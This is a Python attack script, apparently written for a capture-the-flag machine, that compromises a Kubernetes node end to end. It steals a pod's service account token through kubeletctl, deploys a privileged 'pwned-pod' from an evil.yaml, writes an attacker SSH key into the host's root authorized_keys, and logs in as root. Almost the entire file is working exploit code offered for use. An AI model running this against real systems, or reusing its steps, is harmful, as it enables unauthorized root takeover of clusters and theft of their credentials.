#!/usr/bin/python3

# This script must be run as root
# SSH private and public keys of the root user running the script will be removed to generate new ones

import signal, sys, os, subprocess, time

def handle_exit(sig, frame):
    print("\nInterrupted\n\nExiting...\n")
    sys.exit(1)

# Ctrl + C exits the script
signal.signal(signal.SIGINT, handle_exit)

# Globals
kubernetesPort = 8443

def getKubernetesData(ip):

    os.system('kubeletctl -s %s -p nginx -c nginx exec "cat /run/secrets/kubernetes.io/serviceaccount/ca.crt" > ca.crt' % ip)
    os.system('kubeletctl -s %s -p nginx -c nginx exec "cat /run/secrets/kubernetes.io/serviceaccount/token" > token' % ip)

    tokenFile = open('token', 'r')
    token = tokenFile.read()

    tokenFile.close()

    return token

def generateSSHKeys():

    os.system('mkdir /root/.ssh 2>/dev/null')
    os.system('rm -rf /root/.ssh/id_rsa /root/.ssh/id_rsa.pub')
    os.system('ssh-keygen -f /root/.ssh/id_rsa -q -N ""')

    sshFile = open('/root/.ssh/id_rsa.pub', 'r')
    ssh_pub = sshFile.read()

    sshFile.close()

    return ssh_pub

if __name__ == '__main__':

    if len(sys.argv) != 2:
        print("\nUsage:\n\n\tpython3 %s <target IP>\n" % sys.argv[0])
        sys.exit(1)

    if os.getuid() != 0:
        print("\nYou must be root\n")
        sys.exit(1)

    ip = sys.argv[1]

    response = subprocess.Popen(
            ['ping', '-c', '1', ip], stdout=subprocess.PIPE)

    response.communicate()

    if response.returncode != 0:
        print("\nInvalid IP\n")
        sys.exit(1)

    try:

        token = getKubernetesData(ip)

        time.sleep(1)

        # Creates a new pod named pwned-pod using the evil.yaml file
        os.system("kubectl -s https://%s:%s --certificate-authority=ca.crt --token='%s' apply -f evil.yaml" % (ip, kubernetesPort, token))

        time.sleep(2)

        # Removes SSH keys and generates new ones to access the target machine via SSH without credentials
        ssh_pub = generateSSHKeys()

        # Adds the generated public SSH key to the authorized_keys file in the new pod created
        os.system('kubeletctl -s %s -p pwned-pod -c pwned-pod exec "mkdir /mnt/root/.ssh/"' % ip)
        os.system('kubeletctl -s %s -p pwned-pod -c pwned-pod exec "rm -rf /mnt/root/.ssh/authorized_keys"' % ip)
        os.system('kubeletctl -s %s -p pwned-pod -c pwned-pod exec "touch /mnt/root/.ssh/authorized_keys"' % ip)
        os.system('echo "echo \'%s\' > /mnt/root/.ssh/authorized_keys && exit" | xclip -selection clipboard' % ssh_pub)
        print("\n\nPress Ctrl+Shift+V and Enter in the following terminal\n\n")
        os.system('kubeletctl -s %s -p pwned-pod -c pwned-pod exec "bash"' % ip)

        os.system('reset')
    
        # Connects to the target via SSH without credentials
        os.system('ssh root@%s' % ip)
    
    except Exception as e:
        log.error(str(e))
